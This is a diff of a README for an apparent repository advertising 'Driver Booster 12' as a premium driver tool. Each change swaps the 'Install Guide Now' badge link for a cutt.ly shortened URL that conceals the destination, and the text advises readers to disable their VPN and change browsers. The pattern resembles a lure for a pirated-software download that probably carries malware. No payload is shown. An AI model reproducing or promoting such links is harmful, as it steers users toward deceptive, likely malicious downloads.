@@ -5,7 +5,7 @@
 
 **Description**: Optimize your PC with **Driver Booster 12**, a premium tool for updating drivers and boosting performance! This repository offers tutorials, resources, and tips to explore Driver Boosterâ€™s features for enhancing system stability and gaming. Start with accessible driver tools and join our community of tech enthusiasts in 2025!  
 
-<a href="https://free-driver-booster-hub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/DrNtYjdr" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -35,7 +35,7 @@ Boost your PC performance with these simple steps to set up Driver Booster 12! ð
    - Disable your VPN to avoid connection issues.  
    - Switch to another browser (e.g., Chrome, Firefox, or Edge) for a smoother experience.  
 
-<a href="https://free-driver-booster-hub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/DrNtYjdr" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
